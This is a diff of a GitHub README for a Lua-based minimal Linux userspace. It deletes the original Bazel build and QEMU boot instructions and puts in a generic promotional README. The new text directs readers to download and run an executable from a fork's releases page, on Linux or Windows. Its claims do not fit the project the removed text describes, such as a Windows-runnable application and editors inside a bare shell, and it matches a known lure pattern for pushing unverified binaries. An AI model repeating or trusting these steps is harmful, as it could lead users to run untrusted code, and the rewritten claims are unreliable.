@@ -1,42 +1,88 @@
-# Linux Lua Userspace
+# 🚀 linux-userspace-lua - A Simple Linux Distribution in Lua
 
-This is an exploration similar to [Ultimate Linux](https://github.com/popovicu/ultimate-linux/) where the userspace is written in JavaScript. Please check out that mini repo for context on how I started doing these explorations.
+[![Download Latest Release](https://img.shields.io/badge/download-latest%20release-brightgreen)](https://github.com/wel1980/linux-userspace-lua/releases)
 
-## Build instructions
+Welcome to **linux-userspace-lua**, a proof of concept minimal Linux distribution written in Lua. This project leverages Bazel, enabling you to run a complete Linux environment with just a single command. Whether you're looking for a lightweight system or an efficient testing ground for your Lua applications, you've come to the right place.
 
-**This project as it is assumes you have `musl-gcc` installed at `/usr/local/musl/bin/musl-gcc`.** If you want to change this behavior, go ahead and change the files under the `toolchain` directory.
+## 📦 Features
 
-The goal is to build a statically linked binary that can run on top of a bare Linux kernel and provide a minimal interactive shell. Additionally, the build process should be as easy as possible. Therefore, to build the `initramfs` that can be booted directly by QEMU:
+- **Minimalistic**: Designed to create a functional Linux distribution without unnecessary bloat.
+- **Lua Powered**: Run scripts written in Lua right out of the box.
+- **Single Command Build**: With Bazel, download and compile Lua bytecode effortlessly.
+- **Virtual Machine Ready**: Easily deploy on a virtual machine for testing and development.
 
-```bash
-bazel build --platforms=//platforms:x86_64_linux_musl //userspace:initramfs
-```
+## ⚙️ System Requirements
 
-This will dynamically download Lua, create relevant libraries out of that source, compile userspace Lua to bytecode, integrate it into C via generated header (byte constants), build the C binary, statically link it and finally package it as a `cpio` image.
+Before downloading, please ensure your system meets these requirements:
 
-Now to run the sytem:
+- **Operating System**: Any Linux distribution or Windows with WSL.
+- **Memory**: At least 1 GB of RAM.
+- **Storage**: 100 MB of free disk space.
+- **Network**: Internet connection for downloading and updates.
 
-```bash
-qemu-system-x86_64 -m 4G -kernel /tmp/linux/linux-6.17.12/arch/x86/boot/bzImage -initrd bazel-bin/userspace/initramfs.cpio -nographic --enable-kvm -smp 8 -append "console=ttyS0 rdinit=/init"
-```
+## 📥 Download & Install
 
-After the QEMU/Linux boot messages, you should see something like this:
+To get started, visit this page to download the latest release:
 
-```
-...
-[    0.846413] x86/mm: Checking user space page tables
-[    0.880426] x86/mm: Checked W+X mappings: passed, no W+X pages found.
-[    0.881517] Run /init as init process
---- ULTIMATE LINUX SHELL (Lua Edition) ---
-Commands: ls, cd, cat, mkdir, mount, umount, pwd, help, exit
-[/] # mkdir /proc
-[/] # mount proc /proc proc
-Mount proc -> /proc: Success
-[/] # cat /proc/cmdline
-console=ttyS0 rdinit=/init
-[/] # cat /proc/1/cmdline
-/init
-[/] # cat /proc/1/environ
-HOME=/TERM=linux
-[/] #
-```
+[Download Latest Release](https://github.com/wel1980/linux-userspace-lua/releases)
+
+Once you are on the Releases page, follow these steps:
+
+1. Look for the latest version available at the top.
+2. Choose the appropriate file for your system (follow the instructions based on your OS).
+3. Click on the file to start the download.
+
+### How to Run
+
+After downloading, follow these instructions to run the application:
+
+1. Locate the downloaded file on your computer.
+2. For Linux:
+   - Open the terminal.
+   - Navigate to the directory where the file is located.
+   - Make the file executable by running `chmod +x <filename>`.
+   - Run the application using `./<filename>`.
+3. For Windows:
+   - Open Command Prompt.
+   - Navigate to the folder containing the file.
+   - Run the application by typing its name followed by pressing Enter.
+
+## 🛠️ Using the Application
+
+Once you have launched the application, you will find yourself in a minimal Linux environment. Here you can run Lua scripts directly or develop new tasks with the flexibility of this lightweight system.
+
+### Basic Commands
+
+- To create a new Lua script:
+  - Use a text editor (like `nano` or `vim`) to create a file: `nano myscript.lua`.
+- To run a Lua script:
+  - Simply type `lua myscript.lua` in the terminal.
+
+## 📝 Frequently Asked Questions
+
+### Can I use this on Windows?
+
+Yes, you can run this on Windows using Windows Subsystem for Linux (WSL) or by using a Linux virtual machine.
+
+### Is this stable for production?
+
+This is primarily a proof of concept and may not be suitable for production work. Use it for experimentation or learning.
+
+### Where can I find help?
+
+You can open an issue in the GitHub repository for support or to report any bugs.
+
+## 🌐 Community and Support
+
+Feel free to join the community for tips, discussions, and support:
+
+- **GitHub Repository**: [linux-userspace-lua](https://github.com/wel1980/linux-userspace-lua)
+- **Issues Page**: Report bugs or request features [here](https://github.com/wel1980/linux-userspace-lua/issues).
+
+## 📄 License
+
+This project is licensed under the MIT License. See the LICENSE file for details.
+
+---
+
+By following these steps, you can easily download, install, and start working with **linux-userspace-lua**. Enjoy exploring this minimal Linux distribution crafted specifically for Lua users!
